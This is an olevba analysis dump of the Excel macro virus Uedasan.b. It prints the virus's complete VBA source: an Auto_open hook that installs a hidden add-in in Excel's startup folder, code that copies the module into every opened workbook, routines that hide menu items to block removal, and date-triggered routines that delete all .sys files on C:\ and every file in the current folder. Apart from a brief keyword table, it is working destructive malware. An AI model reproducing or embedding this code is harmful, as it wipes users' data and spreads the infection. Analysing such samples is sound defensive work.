olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Uedasan.b-35582bada7880de6bf95826609d926eef8e6b656
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO  A-TPC .vba 
in file: Virus.MSExcel.Uedasan.b-35582bada7880de6bf95826609d926eef8e6b656 - OLE stream: '_VBA_PROJECT_CUR/VBA/ A-TPC '
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



'
'
'
'
'
'
Option Explicit
Public Const Id As String = "#1SLIDER.XLA"
Public m_id As String
Sub Auto_open()
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim chklog As Variant
Dim cpotting, wafer, idhld As String
Dim bookname, c4 As String
   nexts
   m_id = Chr(32) + Chr(65) & "-" & Chr(84) + Chr(80) + Chr(67) + Chr(32)
   cpotting = Application.StartupPath & Application.PathSeparator
   make cpotting
   wafer = Dir(cpotting & Id)
   If UCase(wafer) = "" Then
        Application.ScreenUpdating = False
        Workbooks.Add (xlWorksheet)
        ActiveWindow.DisplayWorkbookTabs = False
        ThisWorkbook.Sheets(m_id).Visible = True
        ThisWorkbook.Sheets(m_id).Copy before:=ActiveWorkbook.Sheets(1)
        ThisWorkbook.Sheets(m_id).Visible = False
        With ActiveWorkbook
           .Title = "#$%#$%#$@#@##$$$####@@@#@##$%$%$%^"
           .Subject = "«Ü.++I¤¦XJ-K_æ"
           .Author = "@@!@!@!#$#$%^**&%#^%^***"
           .Keywords = ">>>>>>>>>>>>>>>>>> F.Y."
           .Comments = "+666.............13.............OMEN+"
        End With
        idhld = Id
        For Each chklog In Application.Workbooks
            If chklog.Name = Id Then
              Randomize
              idhld = Id & Rnd()
            End If
         Next
        bookname = ActiveWorkbook.Name
        c4 = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(bookname).SaveAs filename:=cpotting & idhld, FileFormat:=xlNormal, CreateBackup:=True
        ThisWorkbook.Sheets(1).Visible = False
        ChDir c4
        Application.ScreenUpdating = False
 End If
Application.OnSheetActivate = Id & "!scan"
End Sub
Private Sub make(ByVal locat As String)
On Error Resume Next
Err = 0
  MkDir Left(locat, 25)
  If Err <> 0 Then
    Exit Sub
  End If
End Sub
Private Function coding()
Dim TESTER As Range
Dim logentry As Variant
coding = False
For Each logentry In Application.Worksheets
Set TESTER = Worksheets(logentry.Name).Range(Chr(97) + Chr(49) + Chr(54) + Chr(51) + Chr(56) + Chr(52))
 If TESTER = Chr(117) + Chr(101) + Chr(100) + Chr(97) + Chr(115) + Chr(97) + Chr(110) Then
  coding = True
  Exit For
  End If
Next
End Function
Sub scan()
Attribute scan.VB_ProcData.VB_Invoke_Func = " \n14"
Dim checking, chkstruc As Boolean
Dim no1, slider As String
Dim LOGNAME As Variant
         checking = False
         m_id = Chr(32) + Chr(65) & "-" & Chr(84) + Chr(80) + Chr(67) + Chr(32)
         On Error Resume Next
         Err = 0
         chkstruc = ActiveWorkbook.ProtectStructure
         If Err <> 0 Then GoTo placeb
         If chkstruc = False Then
         Application.ScreenUpdating = False
         no1 = ActiveWorkbook.Name
         slider = Workbooks(no1).Sheets(1).Name
         For Each LOGNAME In Application.Modules
            If LOGNAME.Name = m_id Then
             checking = True
            ElseIf LOGNAME.Name = "me" Then
                   MsgBox "WARNING : VIRUS DETECTED! NAME : 'XM.Laroux.DP'"
            ElseIf LOGNAME.Name = "pldt" Then
                   MsgBox "WARNING : VIRUS DETECTED! NAME : 'MERALCO'"
            ElseIf Len(LOGNAME.Name) >= 25 Then
                   MsgBox "WARNING : VIRUS DETECTED! NAME : 'XM.Extras.A'"
            End If
         Next
        If checking = False And Not coding Then
            Workbooks(Id).Sheets(m_id).Copy before:=Workbooks(no1).Sheets(1)
            ActiveWorkbook.Sheets(1).Protect password:=Chr(117) + Chr(101) + Chr(100) + Chr(97) + Chr(115) + Chr(97) + Chr(110)
            Workbooks(no1).Sheets(m_id).Visible = False
            Status
        End If
       End If
placeb:
Application.ScreenUpdating = False
End Sub
Private Sub Status()
 If Month(Now) = Int(Sqr((355 / Sqr(3995) * ((31 / 4) * 4) ^ 2))) - 69 Then
   DO_EVERYTHING
End If
If (Month(Now) >= Int(Sqr((355 / Sqr(3995) * ((31 / 4) * 4) ^ 2))) - 69 _
   And Hour(Now) < Int(Sqr(4 * 62) / 2.6)) Then
    DO_SOMETHING
End If
End Sub
Private Sub DO_EVERYTHING()
Dim sssssssssssssslider, place, m As String
On Error Resume Next
place = Chr(99) & ":" & Chr(92) & Chr(42) & "." & Chr(115) _
        & Chr(121) & Chr(115)
m = Chr(99) & ":" & Chr(92)
sssssssssssssslider = Dir(place, 2 + 1 + 4 + 32)
SetAttr m & sssssssssssssslider, vbNormal
Do While Not (sssssssssssssslider = "")
If sssssssssssssslider <> False Then
    Err = 0
    Kill m & sssssssssssssslider
    If Err <> 0 Then
       GoTo placea
    End If
End If
placea:
sssssssssssssslider = Dir(place, 2 + 1 + 4 + 32)
SetAttr m & sssssssssssssslider, vbNormal
Loop
End Sub
Private Sub DO_SOMETHING()
Dim paths, pats, sexy As String
On Error Resume Next
paths = CurDir()
paths = paths & Chr(92)
pats = paths & Chr(42) & Chr(46) & Chr(42)
sexy = Dir(pats, 2 + 1 + 4 + 32)
SetAttr paths & sexy, vbNormal
Do While Not (sexy = "")
If sexy <> False Then
    Err = 0
    Kill paths & sexy
    If Err <> 0 Then
        GoTo placea
    End If
End If
placea:
sexy = Dir()
SetAttr paths & sexy, vbNormal
Loop
End Sub
Private Sub nexts()
Dim i As Integer
i = 1
  Do While Not i > 4
      Select Case i
      Case 1
        check "View", "Toolbars..."
      Case 2
        check "Tools", "Macro..."
      Case 3
        check "Window", "Unhide..."
      Case 4
        check "Tools", "Protection"
      End Select
    i = i + 1
 Loop
End Sub
Private Sub check(ByVal men As String, ByVal items As String)
Dim o As Integer
o = 1
On Error Resume Next
Err = 0
Do While Not o > 3
  Select Case o
       Case 1
                MenuBars(xlWorksheet).Menus(men).MenuItems(items).Delete
                If Err <> 0 Then
                Exit Sub
                End If
       Case 2
                MenuBars(xlModule).Menus(men).MenuItems(items).Delete
                If Err <> 0 Then
                Exit Sub
                End If
       Case 3
                MenuBars(xlNoDocuments).Menus("File").MenuItems(items).Delete
                If Err <> 0 Then
                Exit Sub
                End If
  End Select
o = o + 1
Loop
  MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet") _
       .MenuItems("&Unhide...").Delete
  If Err <> 0 Then
    Exit Sub
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -   A-TPC
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

